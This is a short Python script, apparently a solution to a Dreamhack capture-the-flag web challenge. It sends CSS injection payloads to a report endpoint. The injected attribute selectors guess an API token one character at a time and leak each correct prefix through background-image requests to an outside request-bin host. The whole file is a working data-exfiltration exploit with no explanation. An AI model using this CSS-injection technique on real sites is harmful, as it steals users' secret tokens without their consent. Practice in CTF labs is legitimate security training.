import requests
import string

URL = "http://host3.dreamhack.games:22655/report"
token = 'zaghidnulnplwltz'

for i in string.ascii_lowercase:
    data = {"path":"mypage?color=white;} input[id=InputApitoken][value^="+token+i+"] {background: url(https://upxrdih.request.dreamhack.games/"+token+i+");"}
    res = requests.post(URL, data=data)
    print(token+i)